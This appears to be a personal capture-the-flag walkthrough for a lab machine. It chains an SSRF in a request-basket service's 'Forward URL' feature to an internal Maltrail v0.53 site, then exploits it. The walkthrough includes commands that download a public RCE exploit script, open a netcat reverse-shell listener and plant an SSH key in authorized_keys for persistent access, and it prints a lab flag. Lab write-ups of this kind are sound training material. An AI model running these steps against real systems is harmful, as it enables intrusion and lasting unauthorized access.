# HTTP / 5555

/web => Create new basket:
![[Pasted image 20251204100459.png]]
Looks like the default basket IDs are only 7 characters long.

Feroxbuster:
```
200      GET      230l      606w     8700c http://10.129.229.26:55555/web
302      GET        2l        2w       27c http://10.129.229.26:55555/ => http://10.129.229.26:55555/web
200      GET      360l      928w    13021c http://10.129.229.26:55555/web/baskets
```

# SSRF

The configuration allows to set a "Forward URL", i.e. any request is forwarded to that URL.
If "Proxy Response" is enabled, the response from the forwarded URL is returned.
If "Expand Forward Path" is enabled, the URI after the basket ID is used as a URI for the forwarded URL. Example:
`http://10.129.229.26:55555/pid6apx/test123/` => `http://<forward-url>/test123/`

![[Pasted image 20251204105853.png]]

# Internal website

If the "Forward URL" is set to `http://127.0.0.1:80` or  `http://127.0.0.1:8338` we can access an internal website.

![[Pasted image 20251204110509.png]]

A google search reveals that there are RCE exploits available for "Maltrail v0.53":
- https://github.com/Rubioo02/Maltrail-v0.53-RCE/blob/main/README.md
- https://www.rapid7.com/db/modules/exploit/unix/http/maltrail_rce/

# RCE exploit

Download exploit:
```bash
wget https://raw.githubusercontent.com/Rubioo02/Maltrail-v0.53-RCE/main/exploit.sh
```

Run:
```bash
chmod +x exploit.sh

nc -nlvp 4444

./exploit.sh -t http://10.129.229.26:55555/pid6apx/ -i 10.10.14.98
```
BINGO! We get a shell as user "puma"

# Shell as puma

Flag:
```bash
cd /home/puma/
cat user.txt
# db7823f377027616e9adb75b084762a7
```

# Create SSH keypair

On Kali:
```bash
ssh-keygen
# id_ed25519
# id_ed25519.pub

python3 -m http.server 80
```

Copy public key to target:
```bash
mkdir .ssh
cd .ssh
wget http://10.10.14.98/id_ed25519.pub -O authorized_keys
```

# SSH access

```bash
ssh -i ./id_ed25519 puma@10.129.229.26
```